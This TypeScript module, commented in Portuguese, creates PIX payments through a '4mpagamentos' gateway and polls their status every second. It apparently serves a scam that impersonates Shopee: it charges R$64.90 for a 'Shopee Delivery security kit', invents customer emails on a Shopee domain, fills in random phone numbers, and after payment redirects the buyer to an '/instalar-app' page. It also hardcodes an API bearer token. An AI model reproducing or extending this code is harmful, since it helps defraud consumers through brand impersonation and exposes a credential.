/**
 * Cliente para pagamentos PIX via API 4mpagamentos
 */

// Interface para os dados da solicitação de pagamento
export interface PaymentRequest {
  name: string;
  cpf: string;
  email?: string;
  phone?: string;
  amount?: number;
}

// Interface para a resposta do pagamento
export interface PaymentResponse {
  id: string;
  gateway_id: string;
  pixCode: string;
  pixQrCode: string;
  status?: string;
  error?: string;
}

// Configuração da API
const API_URL = 'https://app.4mpagamentos.com/api/v1/payments';
const API_STATUS_URL = 'https://app.4mpagamentos.com/api/v1/transactions';
const API_TOKEN = '3mpag_p7czqd3yk_mfr1pvd2';

/**
 * Cria um pagamento PIX usando a API 4mpagamentos com verificação de status automática
 */
export async function createPixPaymentComplete(paymentData: {
  amount: number;
  customer_name: string;
  customer_email: string;
  customer_cpf: string;
  customer_phone: string;
  description: string;
}): Promise<PaymentResponse> {
  try {
    console.log('[4MPAGAMENTOS] Criando transação PIX...');
    
    // 1. CRIAÇÃO DA TRANSAÇÃO
    const response = await fetch(API_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${API_TOKEN}`
      },
      body: JSON.stringify(paymentData)
    });
    
    if (!response.ok) {
      throw new Error('Erro ao criar pagamento: ' + response.statusText);
    }
    
    const transaction = await response.json();
    console.log('[4MPAGAMENTOS] Transação criada:', transaction);
    
    // 2. VERIFICAÇÃO DE STATUS (A CADA 1 SEGUNDO)
    console.log('[4MPAGAMENTOS] Iniciando verificação de status...');
    
    const checkStatus = async (): Promise<void> => {
      try {
        const statusResponse = await fetch(`${API_STATUS_URL}/${transaction.gateway_id}`);
        
        if (statusResponse.ok) {
          const statusData = await statusResponse.json();
          console.log('[4MPAGAMENTOS] Status:', statusData.status);
          
          if (statusData.status === 'paid') {
            console.log('[4MPAGAMENTOS] PAGAMENTO CONFIRMADO!');
            
            // Executa redirecionamento após 1 segundo
            setTimeout(() => {
              handleRedirect();
            }, 1000);
            
            return; // Para o loop
          } else if (statusData.status === 'expired' || statusData.status === 'cancelled') {
            console.log('[4MPAGAMENTOS] Transação expirada ou cancelada');
            return; // Para o loop
          }
        }
      } catch (error) {
        console.error('[4MPAGAMENTOS] Erro ao verificar status:', error);
      }
      
      // Continua verificando após 1 segundo
      setTimeout(() => checkStatus(), 1000);
    };
    
    // Inicia verificação
    checkStatus();
    
    // Retorna os dados da transação
    return {
      id: transaction.id || transaction.gateway_id,
      gateway_id: transaction.gateway_id,
      pixCode: transaction.pixCode || transaction.pix?.qrCode?.text || '',
      pixQrCode: transaction.pixQrCode || transaction.pix?.qrCode?.image || '',
      status: transaction.status || 'pending'
    };
    
  } catch (error) {
    console.error('[4MPAGAMENTOS] Erro:', error);
    throw error;
  }
}

/**
 * Função de redirecionamento automático para /instalar-app
 */
function handleRedirect(): void {
  const redirectUrl = 'instalar-app';
  console.log('[4MPAGAMENTOS] Redirecionando para:', redirectUrl);
  
  // Redireciona para a página relativa
  window.location.href = window.location.origin + '/' + redirectUrl;
}

/**
 * Função wrapper para compatibilidade com a interface anterior
 */
export async function createPixPayment(data: PaymentRequest): Promise<PaymentResponse> {
  const amount = data.amount || 64.90; // Valor padrão
  
  const paymentData = {
    amount: amount,
    customer_name: data.name,
    customer_email: data.email || `${data.name.toLowerCase().replace(/\s+/g, '.')}.${Date.now()}@mail.shopee.br`,
    customer_cpf: data.cpf.replace(/\D/g, ''), // Remove caracteres não numéricos
    customer_phone: data.phone || generateRandomPhone(),
    description: "Kit de Segurança Shopee Delivery"
  };
  
  return createPixPaymentComplete(paymentData);
}

/**
 * Gera um telefone aleatório quando não fornecido
 */
function generateRandomPhone(): string {
  const ddd = Math.floor(Math.random() * (99 - 11) + 11);
  const number = Math.floor(Math.random() * 1000000000).toString().padStart(9, '0');
  return `${ddd}${number}`;
}